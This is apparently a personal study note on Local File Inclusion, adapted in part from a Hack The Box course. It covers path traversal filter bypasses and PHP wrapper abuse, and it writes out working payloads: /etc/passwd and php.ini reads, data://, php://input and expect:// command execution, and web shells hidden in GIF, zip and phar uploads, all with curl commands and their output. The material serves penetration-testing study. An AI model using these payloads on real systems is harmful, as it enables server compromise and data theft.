---
title: "LFI (Local File Inclusion )"
category: ["S4VITAR", "fases", "6-OWASP 10", "LFI (Local File Inclusion )"]
---

Note title: Untitled

Mario's Penguin
https://www.youtube.com/watch?v=3bxxnX15YuU
https://www.youtube.com/watch?v=t15Xvv6k-1U
S4vitar
https://www.youtube.com/watch?v=64XIkIyCIRo

The **Local File Inclusion** (**LFI**) vulnerability is a computer security flaw that occurs when a web application **does not properly validate** user input, allowing an attacker to **access local files** on the web server.

In many cases, attackers exploit LFI vulnerabilities by abusing input parameters in the web application. Input parameters are data entered by users into the web application, such as URLs or form fields. Attackers can manipulate these input parameters to include local file paths in the request, which may allow them to access files on the web server. This technique is known as **Path Traversal** and is commonly used in LFI attacks.

In a Path Traversal attack, the attacker uses special characters and escape sequences in input parameters to navigate through the web server's directories and access files in sensitive system locations.

For example, an attacker might include "**../**" in the input parameter to move up the directory structure and access files in sensitive system locations.

To prevent LFI attacks, it is crucial for web application developers to properly validate and filter user input, restricting access to system resources and ensuring files can only be included from allowed locations. Additionally, companies should implement appropriate security measures, such as file encryption and limiting unauthorized user access to system resources.

Let's start with the most basic LFI possible.

We'll create a PHP script in /var/www/html so that when we point to it, we can append ?filename='document' and it will display the file. This is important because if the file were properly secured, we shouldn't be able to list anything outside /var/www/html, such as this test file we created:
![Pasted image 20260113163946](/VaultSite/wiki-images/Pasted%20image%2020260113163946.png)
In the script, we'll set it up so that via a GET request, if filename=something is provided, it will display it:
![Pasted image 20260113164111](/VaultSite/wiki-images/Pasted%20image%2020260113164111.png)
We start the Apache server:
![Pasted image 20260113164130](/VaultSite/wiki-images/Pasted%20image%2020260113164130.png)
![Pasted image 20260113164153](/VaultSite/wiki-images/Pasted%20image%2020260113164153.png)
Since this index.php is not sanitized, we can navigate to other paths like /etc/passwd:
![Pasted image 20260113164244](/VaultSite/wiki-images/Pasted%20image%2020260113164244.png)

Now, let's try to force the file to only search within this path. This means that if we try to list /etc/passwd again, it will look for /var/www/html/etc/passwd, which doesn't exist:
![Pasted image 20260113164400](/VaultSite/wiki-images/Pasted%20image%2020260113164400.png)

But now, if we perform a directory path traversal by going back with ../:
![Pasted image 20260113164624](/VaultSite/wiki-images/Pasted%20image%2020260113164624.png)

Next, we'll modify the PHP to block ../ by replacing it with nothing:
![Pasted image 20260113164808](/VaultSite/wiki-images/Pasted%20image%2020260113164808.png)

![Pasted image 20260113164843](/VaultSite/wiki-images/Pasted%20image%2020260113164843.png)
However, this is not recursive, so if we enter ....//....//....//, it will still remove the ../, but the other dots and slashes will remain:
![Pasted image 20260113165128](/VaultSite/wiki-images/Pasted%20image%2020260113165128.png)

Let's use preg_match to block access to /etc/passwd and display a message. However, if we don't use /etc/passwd but instead /etc///////passwd or /etc/././././././../passwd, it will still search for it and won't match the preg_match:
![Pasted image 20260113165902](/VaultSite/wiki-images/Pasted%20image%2020260113165902.png)
As a side note, if we add a ? to the path, it will also display the file because the question mark matches files that fit the pattern:
![Pasted image 20260113170037](/VaultSite/wiki-images/Pasted%20image%2020260113170037.png)

Let's try concatenating a file extension with an include:
![Pasted image 20260113170149](/VaultSite/wiki-images/Pasted%20image%2020260113170149.png)
This works with older PHP versions.

We can append a null byte at the end to bypass the PHP extension restriction:
![Pasted image 20260113171453](/VaultSite/wiki-images/Pasted%20image%2020260113171453.png)

**Using Wrappers**
What is a wrapper?
In the context of an **LFI (Local File Inclusion)** vulnerability, PHP **wrappers** are data access streams that allow manipulating how the server reads or processes a file.

When an attacker finds an LFI, they can typically only read plain text files or execute local `.php` scripts. However, wrappers allow going further, such as reading source code that would otherwise execute or even running arbitrary code.
As an example URL, we'll use http://localhost/?filename=
### 1. `php://filter` (Most commonly used)

**Purpose:** Allows reading the source code of PHP files without the server executing them. This is crucial because if you try to read a configuration file directly, the server processes it and you see nothing; with this filter, you convert it to Base64 to read it.

- **Example:** `?filename=php://filter/convert.base64-encode/resource=config.php` _(This will return the code of `config.php` in Base64)._

With this type of wrapper, we have another vulnerability called **Filter Chains**, which involves encoding and decoding to execute code in the URL. For example, if we want to run `php whoami` to check our identity, we would encode the payload in Base64 using this tool: https://github.com/synacktiv/php_filter_chain_generator 
![Pasted image 20260121162200](/VaultSite/wiki-images/Pasted%20image%2020260121162200.png)
Here, we have the command line encoded in Base64, which would tell us who we are via the URL:
![Pasted image 20260121162257](/VaultSite/wiki-images/Pasted%20image%2020260121162257.png)
### 2. `php://input` (For command execution)

**Purpose:** Reads data sent in the POST request body. If the server allows it, you can send PHP code, and the server will execute it as if it were part of the file.

- **Example:** URL: `?filename=php://input` Payload (in POST body): `<?php system('whoami'); ?>`

### 3. `data://` (Direct injection)

**Purpose:** Allows including data directly in the URL. It's like writing the PHP code you want to execute directly in the address bar, usually encoded to avoid errors.

- **Example:** `?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` _(The Base64 code is `<?php system('id'); ?>`)_.

### 4. `zip://` and `phar://` (For uploaded files)

**Purpose:** Used when you can upload files to the server (e.g., a profile picture). You hide a PHP script inside a ZIP or PHAR file, change its extension to `.jpg`, and use these wrappers to "enter" the compressed file and execute the script. The files must be local to the server.

- **Example:** `?filename=zip://uploads/foto.jpg#shell.php` _(Tells the server: "Open the ZIP foto.jpg and execute the shell.php file inside")._
With this wrapper, if we can upload a malicious file to the server through a form or a profile picture upload, we can call it using this wrapper to execute it.

In URLs, the `#` symbol is used for fragments (anchors), and the browser does not send it to the server. Therefore, to ensure the server receives the internal filename, you must write it **encoded as `%23`**.

### 5. `expect://` (Direct execution)

**Purpose:** The most dangerous but least common, as it requires a specific extension to be installed. It allows executing system commands directly as if you were in a terminal.

- **Example:** `?filename=expect://ls` _(Lists files in the current directory)._

For these wrappers to work, they depend on two critical directives in the `php.ini` file:

|**Wrapper**|**allow_url_fopen**|**allow_url_include**|
|---|---|---|
|`php://filter`|Not required|Not required|
|`php://input`|Not required|**On**|
|`data://`|**On**|**On**|
|`expect://`|Not required|Not required (but requires extension)|


### WRAPPERS

Many popular web applications are developed in PHP, along with various custom web applications built with PHP frameworks like Laravel or Symfony. If we identify an LFI (Local File Inclusion) vulnerability in PHP web applications, we can use different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to extend our LFI exploitation and even achieve remote code execution (RCE).

PHP Wrappers allow us to access different I/O (Input/Output) streams at the application level, such as standard input/output, file descriptors, and memory streams. This has many uses for PHP developers. However, as web penetration testers, we can leverage these wrappers to expand our exploitation attacks and read PHP source code files or even execute system commands. This is not only beneficial for LFI attacks but also for other web attacks like XXE, as covered in the [Web Attacks](https://academy.hackthebox.com/app/module/134) module.

In this section, we'll look at how basic PHP filters are used to read PHP source code, and in the next section, we'll see how different PHP wrappers can help us achieve remote code execution through LFI vulnerabilities.

---

## Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) allow us to transform data from a stream by applying specific filters during stream operations. To use PHP stream wrappers, we can use schemes like `php://`, and we can access the PHP filter wrapper with `php://filter/` to apply filters to a resource.

The `filter` wrapper has several parameters, but the main ones we need for our attack are `resource` and `read`. The `resource` parameter is mandatory for filter wrappers, and with it, we can specify the stream we want to apply the filter to (e.g., a local file), while the `read` parameter can apply different filters to the input resource, so we can use it to specify which filter we want to apply to our resource.

There are four different types of filters available for use: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter at their respective links, but the filter useful for LFI attacks is the `convert.base64-encode` filter under `Conversion Filters`.

---

## PHP File Fuzzing

The first step would be to fuzz for different available PHP pages using a tool like `ffuf` or `gobuster`, as covered in the [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/app/module/54) module:

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]

```

**Tip:** Unlike normal web application usage, we're not restricted to pages with HTTP 200 response codes, since we have local file inclusion access, so we should scan for all codes, including `301`, `302`, and `403` pages, and we should also be able to read their source code.

Even after reading the source code of any identified files, we can `scan them for other referenced PHP files`, then read those as well, until we can capture most of the web application's source code or have an accurate picture of what it does. It's also possible to start by reading `index.php` and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that wouldn't be found otherwise.

---

## Standard PHP Inclusion

In previous sections, if you tried including any PHP file through LFI, you'll have noticed that the included PHP file gets executed and eventually rendered as a normal HTML page. For example, let's try including the `config.php` page (the `.php` extension is added by the web application):

![Shipping containers and cranes in a port.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_config_failed.png)

As we can see, we get an empty result instead of our LFI string, since `config.php` most likely only sets the web application's configuration and doesn't render any HTML output.

This can be useful in certain cases, like accessing local PHP pages we don't have access to (i.e., SSRF), but in most cases, we'd be more interested in reading PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where PHP's `base64` filter becomes useful, as we can use it to base64-encode the PHP file, and then we'd get the encoded source code instead of it being executed and rendered. This is especially useful for cases where we're dealing with LFI with added PHP extensions, because we may be restricted to only including PHP files, as discussed in the previous section.

**Note:** The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we'd get the source code directly and wouldn't need to use additional filters/functions to read it. Check the function table in section 1 to see which functions have which privileges.

----

## Source Code Disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their source code using PHP's `base64` filter. Let's try reading the source code of `config.php` using the base64 filter, specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource` parameter, as follows:


`php://filter/read=convert.base64-encode/resource=config`

http://<SERVER_IP>:< PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
![Shipping containers and cranes in a port with encoded text displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_config_wrapper.png)

**Note:** We intentionally left the resource file at the end of our string, since the `.php` extension is automatically appended to the end of our input string, which would make the resource we specify `config.php`.

As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. Now we can decode this string to get the contents of `config.php`'s source code, as follows:

```
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```
![Pasted image 20261001184418](/VaultSite/wiki-images/Pasted%20image%2020261001184418.png)

---

## Data

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available if the (`allow_url_include`) setting is enabled in PHP configurations. So first, let's confirm whether this option is enabled by reading the PHP configuration file through the LFI (Local File Inclusion) vulnerability.

#### Checking PHP Configurations

To do this, we can include the PHP configuration file located at (`/etc/php/X.Y/apache2/php.ini`) for Apache or (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your installed PHP version. We can start with the latest PHP version and try older versions if we can't locate the configuration file. We'll also use the `base64` filter from the previous section, since `.ini` files are similar to `.php` files and must be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string might be very long and we need to capture it properly:

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64-encoded string, we can decode it and use `grep` to search for `allow_url_include` and check its value:

` echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include  allow_url_include = On`

Excellent! We see this option is enabled, so we can use the `data` wrapper. Knowing how to check the `allow_url_include` option is very important, as `this option is not enabled by default` and is required for several other LFI attacks, such as using the `input` wrapper or for any RFI (Remote File Inclusion) attacks, as we'll see next. It's not uncommon to find this option enabled, as many web applications depend on it to function properly, such as some WordPress plugins and themes, for example.

#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with our attack using the `data` wrapper. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it base64-encoded strings with `text/plain;base64`, and it has the capability to decode and execute the PHP code.

So, our first step will be to base64-encode a basic PHP web shell, as follows:

` echo '<?php system($_GET["cmd"]); ?>' | base64  PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==`

Now, we can URL-encode the base64 string and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can pass commands to the web shell with `&cmd=<COMMAND>`:

http://<SERVER_IP>:< PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

![Shipping containers and cranes in a port with a PHP notice about an undefined variable.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/data_wrapper_id.png)

We can also use cURL for the same attack, as follows:

`curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid             uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between this and the `data` wrapper is that we pass our input to the `input` wrapper as POST request data. Therefore, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our previous attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

`$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid             uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Note:** To pass our command as a GET request, the vulnerable function must also accept GET requests (i.e., use `$_REQUEST`). If it only accepts POST requests, then we can place our command directly in our PHP code instead of a dynamic web shell (e.g., `<?php system('id')?>`)

---

## Expect

Finally, we can use the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to execute commands directly through URL streams. Expect works very similarly to the web shells we've used before, but it doesn't require us to provide a web shell, as it's designed to execute commands.

However, `expect` is an external wrapper, so it must be manually installed and enabled on the back-end server, though some web applications depend on it for their core functionality, so we may find it in specific cases. We can check if it's configured to load on the back-end server as we did earlier with `allow_url_include`, but this time we'd grep for `expect`:

` echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect  extension=expect`

As we can see, the `extension=expect` directive is present in the configuration, indicating the server is set up to attempt loading the `expect` extension. However, this doesn't guarantee the extension is actually functional at runtime, as it could fail to load for many reasons. Therefore, to confirm it's truly available, we need to test it directly by attempting command execution using the `expect://` wrapper and then passing the command we want to execute, as follows:

` curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid  uid=33(www-data) gid=33(www-data) groups=33(www-data)`

As we can see, executing commands through the `expect` module is quite straightforward, as this module was designed for command execution, as mentioned earlier. The [Web Attacks](https://academy.hackthebox.com/app/module/134) module also covers using the `expect` module with XXE vulnerabilities, so if you understand how to use it here, you should be prepared to use it with XXE.

These are the three most common PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the `phar` and `zip` wrappers in upcoming sections, which we can use with web applications that allow file uploads to achieve remote execution through LFI vulnerabilities.

# LFI & File Uploads
File upload functionalities are ubiquitous in most modern web applications, as users often need to configure their profile and application usage by uploading their data. For attackers, the ability to store files on the back-end server can expand the exploitation of many vulnerabilities, such as a file inclusion vulnerability.

The [File Upload Attacks](https://academy.hackthebox.com/app/module/136) module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we'll discuss in this section, we don't need the file upload form to be vulnerable—it just needs to allow us to upload files. If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will execute if we include it, regardless of the file extension or type. For example, we can upload an image file (e.g., `image.jpg`), store PHP web shell code in it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will execute, and we'll achieve remote code execution (RCE).

As mentioned in the first section, the following are the functions that allow code execution with file inclusion—any of them would work with the attacks in this section:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

## Image Uploads

Image uploads are very common in most modern web applications, as uploading images is considered safe if the upload function is securely coded. However, as discussed earlier, the vulnerability in this case isn't in the file upload form but in the file inclusion functionality.

#### Creating a Malicious Image

Our first step is to create a malicious image containing PHP web shell code that still looks and functions as an image. To do this, we'll use an allowed image extension in our filename (e.g., `shell.gif`), and we must also include the image's magic bytes at the start of the file's content (e.g., `GIF8`), in case the upload form checks both the extension and content type. We can do this as follows:

` echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

This file by itself is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with a Local File Inclusion (LFI) vulnerability, we could achieve remote code execution.

**Note:** We're using a `GIF` image in this case because its magic bytes are easy to write, being ASCII characters, while other extensions have binary magic bytes that we'd need to URL encode. However, this attack would work with any allowed image or file type. The [File Upload Attacks](https://academy.hackthebox.com/app/module/136) module covers file type attacks in more depth, and the same logic applies here.

Now, we need to upload our malicious image file. To do this, we can go to the `Profile Settings` page, click on the avatar image to select our file, then click "upload" and our image should upload successfully:

http://<SERVER_IP>:<PORT>/settings.php

![Profile image upload interface with a successful upload message.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_upload_gif.jpg)

#### Uploaded File Path

Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know its path. In most cases, especially with images, we'd have access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:

        html
`<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">`

**Note:** As we can see, we can use `/profile_images/shell.gif` for the file path. If we don't know where the file is uploaded, we could fuzz for an upload directory and then fuzz for our uploaded file, though this doesn't always work since some web applications properly hide uploaded files.

With the uploaded file path in hand, all we need to do is include the file in the LFI-vulnerable function, and the PHP code should execute, like so:

http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

![Shipping containers and cranes at a port with user data information displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_include_uploaded_gif.jpg)

As we can see, we included our file and successfully executed the `id` command.

**Note:** To include our uploaded file, we used `./profile_images/` because in this case the LFI vulnerability doesn't prepend any directory to our input. If it did, we'd just need to traverse out of that directory with `../` and then use our URL path, as we learned in previous sections.

---

## Zip Upload

As mentioned earlier, the previous technique is very reliable and should work in most cases with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of PHP-specific techniques that use PHP wrappers to achieve the same goal. These can be useful in specific cases where the previous technique doesn't work.

We can use the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do this, we can start by creating a PHP web shell script and compressing it into a zip file (named `shell.jpg`), like so:

        shellsession
`snchh337@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`

**Note:** Even though we named our zip file as (shell.jpg), some upload forms may still detect our file as a zip through content-type checks and not allow its upload, so this attack has a higher chance of working if zip file uploads are allowed.

Once we upload the `shell.jpg` file, we can include it with the `zip` wrapper as (`zip://shell.jpg`), then reference any file inside it with `#shell.php` (URL encoded). Finally, we can execute commands as usual with `&cmd=id`, like so:

http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

![Shipping containers and cranes at a port with user data and a PHP notice about an undefined variable.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/data_wrapper_id.png)

As we can see, this method also works to execute commands through compressed PHP scripts.

**Note:** We prepended the upload directory (`./profile_images/`) before the filename since the vulnerable page (`index.php`) is in the root directory.

---

## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do this, we'll first write the following PHP script to a `shell.php` file:

        php
`<?php $phar = new Phar('shell.phar'); $phar->startBuffering(); $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>'); $phar->setStub('<?php __HALT_COMPILER(); ?>');  $phar->stopBuffering();`

This script can be compiled into a `phar` file that, when called, will write a web shell to a subfile `shell.txt`, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` like so:

        shellsession
`snchh337@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`

Now, we should have a phar file named `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, then specify the phar subfile with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), like so:

http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

![Shipping containers and cranes at a port with user data information displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_localhost.jpg)

As we can see, the `id` command executed successfully. Both the `zip` and `phar` wrapper methods should be considered as fallback methods if the first approach doesn't work, since the first method we discussed is the most reliable of the three.

**Note:** There's another (obsolete) LFI/upload attack worth mentioning, which occurs if file uploads are enabled in PHP settings and the `phpinfo()` page is exposed somehow. However, this attack isn't very common, as it has very specific requirements to work (LFI + uploads enabled + old PHP + phpinfo() exposed). If you're interested in learning more about it, you can check [This link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html).